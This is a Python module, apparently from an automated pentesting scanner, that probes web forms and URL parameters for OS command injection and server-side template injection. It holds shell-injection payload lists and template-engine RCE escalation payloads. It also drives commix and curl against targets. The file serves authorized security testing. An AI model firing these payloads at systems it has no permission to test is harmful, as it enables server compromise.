"""
CYPHEX — Agent 06: Command Injection & SSTI Agent

Tests for:
  - OS command injection on all parameters
  - Server-Side Template Injection (SSTI)
  - SSTI to RCE escalation
  - Commix integration (if available)
"""

import re
import shlex
from urllib.parse import quote

from agents.base_agent import BaseAgent
from models.scan import ScanContext, Vuln
from models.agent_result import AgentResult


class CMDiAgent(BaseAgent):

    CMDI_PAYLOADS = [
        # Basic injection
        ("; id", "id"),
        ("| id", "id"),
        ("&& id", "id"),
        ("`id`", "id"),
        ("$(id)", "id"),
        # Windows variants
        ("& whoami", "whoami"),
        ("| whoami", "whoami"),
        # Blind injection (time-based)
        ("; sleep 5", "sleep"),
        ("| sleep 5", "sleep"),
        ("& timeout 5", "timeout"),
    ]

    SSTI_PAYLOADS = [
        ("{{7*7}}", "49", "Jinja2/Twig"),
        ("${7*7}", "49", "Freemarker/EL"),
        ("<%= 7*7 %>", "49", "ERB/EJS"),
        ("#{7*7}", "49", "Ruby/Pug"),
        ("{{7*'7'}}", "7777777", "Jinja2"),
        ("${7*7}", "49", "Spring EL"),
    ]

    @staticmethod
    def _q(value: str) -> str:
        """Shell-quote untrusted values before embedding in terminal commands."""
        return shlex.quote(str(value))

    async def run(self, context: ScanContext) -> AgentResult:
        await self.log("═══ COMMAND INJECTION & SSTI TESTING ═══", "info")

        # ─── 1. Commix (if available) ───
        has_commix = await self.terminal.check_tool("commix")
        if has_commix:
            await self._run_commix(context)

        # ─── 2. Manual command injection on forms ───
        await self.log("Testing forms for command injection...", "info")
        for form in context.all_forms:
            await self._test_cmdi_form(form, context)

        # ─── 3. Test URL parameters for command injection ───
        await self.log("Testing URL params for command injection...", "info")
        # Look for params likely to be command-injectable
        cmdi_params = [
            p for p in context.all_params
            if any(kw in p.name.lower() for kw in [
                'host', 'ip', 'cmd', 'command', 'exec',
                'ping', 'query', 'run', 'system', 'process'
            ])
        ]

        # Also check common injectable endpoints
        for path in ["/api/ping", "/ping", "/api/exec", "/api/system"]:
            for param_name in ["host", "ip", "cmd", "target"]:
                url = f"{context.target_url.rstrip('/')}{path}"
                probe_url = f"{url}?{param_name}=test"
                out = await self.terminal.run(
                    f'curl -s -o /dev/null -w "%{{http_code}}" --max-time 5 {shlex.quote(probe_url)}'
                )
                status = out.stdout.strip().replace("'", "")
                if status not in ["404", "000"]:
                    from models.scan import ParamData
                    cmdi_params.append(ParamData(url=url, name=param_name, value="test"))

        for param in cmdi_params:
            await self._test_cmdi_param(param, context)

        # ─── 4. SSTI testing ───
        await self.log("Testing for Server-Side Template Injection...", "info")
        for form in context.all_forms:
            await self._test_ssti(form, context)

        await self.log(
            f"CMDi/SSTI testing complete: {len(self.vulns)} vulnerabilities found",
            "success" if not self.vulns else "danger",
        )

        return AgentResult(
            agent="CMDiAgent",
            vulns=self.vulns,
            context=context,
            terminal_logs=self.terminal.command_history,
        )

    async def _run_commix(self, context: ScanContext):
        """Run commix automated command injection testing."""
        for form in context.all_forms[:3]:
            if not form.inputs:
                continue
            data_str = "&".join(f"{k}=test" for k in form.inputs)
            await self.log(f"Running commix on {form.action}...", "info")
            url_q = self._q(form.action)
            data_q = self._q(data_str)
            out = await self.terminal.run(
                f'python3 /opt/commix/commix.py --url={shlex.quote(form.action)} '
                f'--data={shlex.quote(data_str)} --batch --level=2',
                timeout=90,
            )
            if "command injection" in out.stdout.lower():
                await self.add_vuln(Vuln(
                    name=f"Command Injection (commix confirmed)",
                    severity="Critical",
                    cvss_score=10.0,
                    endpoint=form.action,
                    confirmed=True,
                    evidence=out.stdout[:500],
                    fix="Never pass user input to shell commands. Use parameterized APIs.",
                ))

    async def _test_cmdi_form(self, form, context: ScanContext):
        """Test a form for command injection."""
        for payload, expected_cmd in self.CMDI_PAYLOADS[:6]:
            for input_field in form.inputs:
                data_parts = []
                for inp in form.inputs:
                    if inp == input_field:
                        data_parts.append(f"{inp}={quote(payload, safe='')}")
                    else:
                        data_parts.append(f"{inp}=test")
                data_str = "&".join(data_parts)
                action_q = self._q(form.action)
                data_q = self._q(data_str)

                if form.method.upper() == "POST":
                    out = await self.terminal.run(
                        f'curl -s -X POST {shlex.quote(form.action)} '
                        f'-d {shlex.quote(data_str)} --max-time 10'
                    )
                else:
                    get_url = f"{form.action}?{data_str}"
                    out = await self.terminal.run(
                        f'curl -s --max-time 10 {shlex.quote(get_url)}'
                    )

                if self._is_cmdi_confirmed(out.stdout, expected_cmd):
                    await self.add_vuln(Vuln(
                        name=f"Command Injection — {form.action}",
                        severity="Critical",
                        cvss_score=10.0,
                        endpoint=form.action,
                        payload=payload,
                        confirmed=True,
                        evidence=out.stdout[:300],
                        description=f"OS command injection via field '{input_field}'",
                        rce_output=out.stdout[:500],
                        fix="Never pass user input to exec/system. Use safe APIs.",
                    ))
                    return  # Found for this form

    async def _test_cmdi_param(self, param, context: ScanContext):
        """Test a URL parameter for command injection."""
        for payload, expected_cmd in self.CMDI_PAYLOADS[:6]:
            encoded = quote(payload, safe="")
            url = f"{param.url}?{param.name}={encoded}"
            url_q = self._q(url)

            out = await self.terminal.run(
                f'curl -s --max-time 10 {shlex.quote(url)}'
            )

            if self._is_cmdi_confirmed(out.stdout, expected_cmd):
                await self.add_vuln(Vuln(
                    name=f"Command Injection — {param.name} param",
                    severity="Critical",
                    cvss_score=10.0,
                    endpoint=param.url,
                    payload=f"{param.name}={payload}",
                    confirmed=True,
                    evidence=out.stdout[:300],
                    rce_output=out.stdout[:500],
                    fix="Never pass URL parameters to shell commands.",
                ))
                return  # Found

    def _is_cmdi_confirmed(self, response: str, expected_cmd: str) -> bool:
        """Check if command injection was successful."""
        if not response:
            return False

        indicators = [
            r"uid=\d+",              # Linux id command
            r"gid=\d+",
            r"root:",                # /etc/passwd content
            r"www-data",
            r"PING\s",              # ping output
            r"bytes from",
            r"ttl=\d+",
            r"\w+\\\w+",           # Windows whoami output
            r"nt authority",
        ]

        for pattern in indicators:
            if re.search(pattern, response, re.IGNORECASE):
                return True

        return False

    async def _test_ssti(self, form, context: ScanContext):
        """Test a form for Server-Side Template Injection."""
        for payload, expected, engine in self.SSTI_PAYLOADS:
            for input_field in form.inputs:
                data_parts = []
                for inp in form.inputs:
                    if inp == input_field:
                        data_parts.append(f"{inp}={quote(payload, safe='')}")
                    else:
                        data_parts.append(f"{inp}=test")
                data_str = "&".join(data_parts)
                action_q = self._q(form.action)
                data_q = self._q(data_str)

                if form.method.upper() == "POST":
                    out = await self.terminal.run(
                        f'curl -s -X POST {shlex.quote(form.action)} '
                        f'-d {shlex.quote(data_str)} --max-time 10'
                    )
                else:
                    get_url = f"{form.action}?{data_str}"
                    out = await self.terminal.run(
                        f'curl -s --max-time 10 {shlex.quote(get_url)}'
                    )

                if out.stdout and expected in out.stdout:
                    await self.log(
                        f"SSTI CONFIRMED on {form.action} field={input_field} "
                        f"engine={engine} payload={payload}",
                        "danger",
                    )

                    await self.add_vuln(Vuln(
                        name=f"SSTI ({engine}) — {form.action}",
                        severity="Critical",
                        cvss_score=9.8,
                        endpoint=form.action,
                        payload=payload,
                        confirmed=True,
                        evidence=out.stdout[:300],
                        description=(
                            f"Server-Side Template Injection detected. "
                            f"Engine: {engine}. Payload {payload} → {expected}"
                        ),
                        fix="Never render user input in templates. Use sandboxed template engines.",
                    ))

                    # Try RCE escalation
                    await self._ssti_to_rce(form, input_field, engine, context)
                    return

    async def _ssti_to_rce(self, form, field, engine, context: ScanContext):
        """Attempt to escalate SSTI to RCE."""
        rce_payloads = {
            "Jinja2": (
                "{{config.__class__.__init__.__globals__"
                "['os'].popen('id').read()}}"
            ),
            "Jinja2/Twig": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "ERB/EJS": "<%= system('id') %>",
            "Freemarker/EL": "${T(java.lang.Runtime).getRuntime().exec('id')}",
        }

        rce_payload = rce_payloads.get(engine)
        if not rce_payload:
            return

        data_parts = []
        for inp in form.inputs:
            if inp == field:
                data_parts.append(f"{inp}={quote(rce_payload, safe='')}")
            else:
                data_parts.append(f"{inp}=test")
        data_str = "&".join(data_parts)
        action_q = self._q(form.action)
        method_q = self._q(form.method)
        data_q = self._q(data_str)

        out = await self.terminal.run(
            f'curl -s -X {shlex.quote(form.method)} {shlex.quote(form.action)} '
            f'-d {shlex.quote(data_str)} --max-time 10'
        )

        if out.stdout and ("uid=" in out.stdout or "root:" in out.stdout):
            await self.add_vuln(Vuln(
                name=f"SSTI → Remote Code Execution",
                severity="Critical",
                cvss_score=10.0,
                endpoint=form.action,
                payload=rce_payload,
                confirmed=True,
                rce_output=out.stdout[:500],
                fix="Critical: Template injection allows full server compromise.",
            ))
